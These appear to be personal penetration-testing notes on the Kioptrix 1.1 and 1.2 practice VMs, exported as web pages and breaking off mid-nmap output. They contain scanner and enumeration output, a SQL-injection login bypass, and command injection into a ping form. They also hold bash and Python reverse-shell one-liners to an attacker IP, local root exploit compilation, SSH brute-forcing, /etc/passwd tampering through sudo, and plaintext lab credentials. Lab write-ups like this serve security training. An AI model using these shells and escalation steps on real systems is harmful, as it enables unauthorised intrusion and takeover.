/></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Fri Nov  1 10:02:49 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 192.168.11.5<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 192.168.11.5    |<br /> ==================================================== <br />[+] Got domain/workgroup name: MYGROUP<br /><br /> ============================================ <br />|    Nbtstat Information for 192.168.11.5    |<br /> ============================================ <br />Looking up status of 192.168.11.5<br />	KIOPTRIX        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	KIOPTRIX        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	KIOPTRIX        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser<br />	MYGROUP         &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	MYGROUP         &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser<br />	MYGROUP         &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br /><br />	MAC Address = 00-00-00-00-00-00<br /><br /> ===================================== <br />|    Session Check on 192.168.11.5    |<br /> ===================================== <br />[+] Server 192.168.11.5 allows sessions using username &#39;&#39;, password &#39;&#39;<br /><br /> =========================================== <br />|    Getting domain SID for 192.168.11.5    |<br /> =========================================== <br />Domain Name: MYGROUP<br />Domain Sid: (NULL SID)<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br /><br /> ====================================== <br />|    OS information on 192.168.11.5    |<br /> ====================================== <br />[+] Got OS info for 192.168.11.5 from smbclient: <br />[+] Got OS info for 192.168.11.5 from srvinfo:<br />	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server<br />	platform_id     :	500<br />	os version      :	4.5<br />	server type     :	0x9a03<br /><br /> ============================= <br />|    Users on 192.168.11.5    |<br /> ============================= <br /><br /><br /> ========================================= <br />|    Share Enumeration on 192.168.11.5    |<br /> ========================================= <br />WARNING: The &quot;syslog&quot; option is deprecated<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />	IPC$            IPC       IPC Service (Samba Server)<br />	ADMIN$          IPC       IPC Service (Samba Server)<br />Reconnecting with SMB1 for workgroup listing.<br /><br />	Server               Comment<br />	---------            -------<br />	KIOPTRIX             Samba Server<br /><br />	Workgroup            Master<br />	---------            -------<br />	MYGROUP              KIOPTRIX<br /><br />[+] Attempting to map shares on 192.168.11.5<br />//192.168.11.5/IPC$	[E] Can&#39;t understand response:<br />WARNING: The &quot;syslog&quot; option is deprecated<br />NT_STATUS_NETWORK_ACCESS_DENIED listing \*<br />//192.168.11.5/ADMIN$	[E] Can&#39;t understand response:<br />WARNING: The &quot;syslog&quot; option is deprecated<br />tree connect failed: NT_STATUS_WRONG_PASSWORD<br /><br /> ==================================================== <br />|    Password Policy Information for 192.168.11.5    |<br /> ==================================================== <br />[E] Unexpected error from polenum:<br /><br /><br />[+] Attaching to 192.168.11.5 using a NULL share<br /><br />[+] Trying protocol 445/SMB...<br /><br />	[!] Protocol failed: [Errno Connection error (192.168.11.5:445)] [Errno 111] Connection refused<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: SMB SessionError: 0x5<br /><br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 0<br /><br /><br /> ============================== <br />|    Groups on 192.168.11.5    |<br /> ============================== <br /><br />[+] Getting builtin groups:<br />group:[Administrators] rid:[0x220]<br />group:[Users] rid:[0x221]<br />group:[Guests] rid:[0x222]<br />group:[Power Users] rid:[0x223]<br />group:[Account Operators] rid:[0x224]<br />group:[System Operators] rid:[0x225]<br />group:[Print Operators] rid:[0x226]<br />group:[Backup Operators] rid:[0x227]<br />group:[Replicator] rid:[0x228]<br /><br />[+] Getting builtin group memberships:<br />Group &#39;Account Operators&#39; (RID: 548) has member: Couldn&#39;t find group Account Operators<br />Group &#39;Power Users&#39; (RID: 547) has member: Couldn&#39;t find group Power Users<br />Group &#39;System Operators&#39; (RID: 549) has member: Couldn&#39;t find group System Operators<br />Group &#39;Replicator&#39; (RID: 552) has member: Couldn&#39;t find group Replicator<br />Group &#39;Print Operators&#39; (RID: 550) has member: Couldn&#39;t find group Print Operators<br />Group &#39;Users&#39; (RID: 545) has member: Couldn&#39;t find group Users<br />Group &#39;Guests&#39; (RID: 546) has member: Couldn&#39;t find group Guests<br />Group &#39;Administrators&#39; (RID: 544) has member: Couldn&#39;t find group Administrators<br />Group &#39;Backup Operators&#39; (RID: 551) has member: Couldn&#39;t find group Backup Operators<br /><br />[+] Getting local groups:<br />group:[sys] rid:[0x3ef]<br />group:[tty] rid:[0x3f3]<br />group:[disk] rid:[0x3f5]<br />group:[mem] rid:[0x3f9]<br />group:[kmem] rid:[0x3fb]<br />group:[wheel] rid:[0x3fd]<br />group:[man] rid:[0x407]<br />group:[dip] rid:[0x439]<br />group:[lock] rid:[0x455]<br />group:[users] rid:[0x4b1]<br />group:[slocate] rid:[0x413]<br />group:[floppy] rid:[0x40f]<br />group:[utmp] rid:[0x415]<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br />group:[Domain Admins] rid:[0x200]<br />group:[Domain Users] rid:[0x201]<br /><br />[+] Getting domain group memberships:<br />Group &#39;Domain Users&#39; (RID: 513) has member: Couldn&#39;t find group Domain Users<br />Group &#39;Domain Admins&#39; (RID: 512) has member: Couldn&#39;t find group Domain Admins<br /><br /> ======================================================================= <br />|    Users on 192.168.11.5 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623<br />[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\ (0)<br />S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)<br />S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)<br />S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)<br />S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)<br /><br /> ============================================= <br />|    Getting printer info for 192.168.11.5    |<br /> ============================================= <br />No printers returned.<br /><br /><br />enum4linux complete on Fri Nov  1 10:03:03 2019<br /><br /></div><div class='page'><h1 class='title level-5'>rooted</h1><br/></div><div class='page'><h1 class='title level-4'>Kioptrix 1.1</h1><br/>quick nmap showed that the machine was running 22, 80, 111, 443, 631, 3306<br />22 not no login and not vulnerable<br />80 dirsearch showed index.php right at the top<br />This looks like a login page...<br />any time I see a login page I try   <code>admin&#39; or 1=1 #</code>    and bam! admin!!<br />the page seems to runs ping on whatever we give it<br />1.1.1.1      yup<br />1.1.1.1; whoami      it shows us apache!<br />start nc listenter<br />1.1.1.1; bash -i &gt;&amp; /dev/tcp/192.168.11.252/3232 0&gt;&amp;1<br />BOOM! apache shell<br />cat /etc/redhat-release     shows us that it is a crazy old version of redhat             CentOS release 4.5 (Final)<br />searchsploit 4.5 centos      shows us 9542.c<br />wget over<br />gcc -o 9542 9542.c<br />./9542<br />whoami<br />root<br />!!!!!!!!!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>192.168.11.252 -c 10000000000 &amp; python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.11.252&quot;,3232));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;<br /><br />bash -i &gt;&amp; /dev/tcp/192.168.11.252/3232 0&gt;&amp;1           &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br />mysql_connect(&quot;localhost&quot;, &quot;john&quot;, &quot;hiroshima&quot;) or die(mysql_error());<br /><br /><br />gcc -o 0x82-CVE-2009-2698 0x82-CVE-2009-2698.c &amp;&amp; ./0x82-CVE-2009-2698</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 192.168.11.6<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-06 14:52 EST<br />Nmap scan report for 192.168.11.6<br />Host is up (0.0023s latency).<br />Not shown: 994 closed ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />80/tcp   open  http<br />111/tcp  open  rpcbind<br />443/tcp  open  https<br />631/tcp  open  ipp<br />3306/tcp open  mysql<br />MAC Address: 00:0C:29:DE:17:52 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds<br /></div><div class='page'><h1 class='title level-6'>nikto 443</h1><br/>nikto -host <a href="http://192.168.11.6:443">http://192.168.11.6:443</a> | tee nikto_192.168.11.6:443<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.6<br />+ Target Hostname:    192.168.11.6<br />+ Target Port:        443<br />---------------------------------------------------------------------------<br />+ SSL Info:        Subject:  /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain<br />                   Ciphers:  DHE-RSA-AES256-SHA<br />                   Issuer:   /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain<br />+ Start Time:         2019-11-06 14:54:00 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.0.52 (CentOS)<br />+ Retrieved x-powered-by header: PHP/4.3.9<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ Hostname &#39;192.168.11.6&#39; does not match certificate&#39;s names: localhost.localdomain<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ Server leaks inodes via ETags, header found with file /manual/, fields: 0x5770d 0x1c42 0xac5f9a00;5770b 0x206 0x84f07cc0 <br />+ Uncommon header &#39;tcn&#39; found, with contents: choice<br />+ OSVDB-3092: /manual/: Web server manual found.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3268: /manual/images/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8346 requests: 1 error(s) and 19 item(s) reported on remote host<br />+ End Time:           2019-11-06 15:01:07 (GMT-5) (427 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>dirsearch 80</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u http://192.168.11.6:80 --simple-report dirsearchsimple_192.168.11.6:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-06_14-54-01.log<br /><br />Target: http://192.168.11.6:80<br /><br />[14:54:01] Starting: <br />[14:54:01] 200 -  667B  - /index.php<br />[14:54:01] 403 -  288B  - /cgi-bin/<br />[14:54:01] 200 -   18KB - /icons/<br />[14:54:03] 200 -    7KB - /manual/<br />[14:54:04] 403 -  286B  - /usage/<br />[14:54:08] 403 -  286B  - /error/<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>nikto 80</h1><br/>nikto -host <a href="http://192.168.11.6:80">http://192.168.11.6:80</a> | tee nikto_192.168.11.6:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.6<br />+ Target Hostname:    192.168.11.6<br />+ Target Port:        80<br />+ Start Time:         2019-11-06 14:54:00 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.0.52 (CentOS)<br />+ Retrieved x-powered-by header: PHP/4.3.9<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ Server leaks inodes via ETags, header found with file /manual/, fields: 0x5770d 0x1c42 0xac5f9a00;5770b 0x206 0x84f07cc0 <br />+ Uncommon header &#39;tcn&#39; found, with contents: choice<br />+ OSVDB-3092: /manual/: Web server manual found.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3268: /manual/images/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8346 requests: 1 error(s) and 17 item(s) reported on remote host<br />+ End Time:           2019-11-06 14:55:12 (GMT-5) (72 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/</div><div class='page'><h1 class='title level-6'>nmap full</h1><br/>nmap -sC -sV -p- 192.168.11.6<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-06 14:53 EST<br />Nmap scan report for 192.168.11.6<br />Host is up (0.0025s latency).<br />Not shown: 65528 closed ports<br />PORT     STATE SERVICE  VERSION<br />22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)<br />| ssh-hostkey: <br />|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)<br />|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)<br />|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)<br />|_sshv1: Server supports SSHv1<br />80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))<br />|_http-server-header: Apache/2.0.52 (CentOS)<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />111/tcp  open  rpcbind  2 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2            111/tcp  rpcbind<br />|   100000  2            111/udp  rpcbind<br />|   100024  1            792/udp  status<br />|_  100024  1            795/tcp  status<br />443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))<br />|_http-server-header: Apache/2.0.52 (CentOS)<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--<br />| Not valid before: 2009-10-08T00:10:47<br />|_Not valid after:  2010-10-08T00:10:47<br />|_ssl-date: 2019-11-06T18:49:54+00:00; -1h03m52s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|     SSL2_DES_64_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|_    SSL2_DES_192_EDE3_CBC_WITH_MD5<br />631/tcp  open  ipp      CUPS 1.1<br />| http-methods: <br />|_  Potentially risky methods: PUT<br />|_http-server-header: CUPS/1.1<br />|_http-title: 403 Forbidden<br />795/tcp  open  status   1 (RPC #100024)<br />3306/tcp open  mysql    MySQL (unauthorized)<br />MAC Address: 00:0C:29:DE:17:52 (VMware)<br /><br />Host script results:<br />|_clock-skew: mean: -1h03m52s, deviation: 0s, median: -1h03m52s<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds<br /></div><div class='page'><h1 class='title level-4'>kioptrix 1.2</h1><br/>nmap showed 22 and 80 open<br />looking at the webpage /blog we see that the user loneferret is referenced<br />put loneferret against hydra for ssh and Boom we got creds (starwars)<br />ssh loneferret@192.168.11.7<br />yeet!<br />sudo -l shows us that we can run /usr/local/bin/ht<br />ht is a text editor for assembly code<br /><br />here is my ht notes<br />sudo /usr/local/bin/ht /etc/passwd<br />f6 &gt; text &gt; f3 &gt; down down select <br />comment out root<br />root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash<br />f2 (to save)<br />ctrl c<br />cat /etc/passwd<br />su -l root<br />coolhand<br />whoami<br />    root!!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 192.168.11.7<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-06 18:40 EST<br />Nmap scan report for kipotrix3.com (192.168.11.7)<br />Host is up (0.0018s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br />MAC Address: 00:0C:29:67:AF:E2 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds<br /><br /><br /><br /><br />nmap -sC -sV -p- 192.168.11.7<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-06 18:40 EST<br />Nmap scan report for kipotrix3.com (192.168.11.7)<br />Host is up (0.0084s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)<br />|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)<br />80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)<br />| http-cookie-flags: <br />|   /: <br />|     PHPSESSID: <br />|_    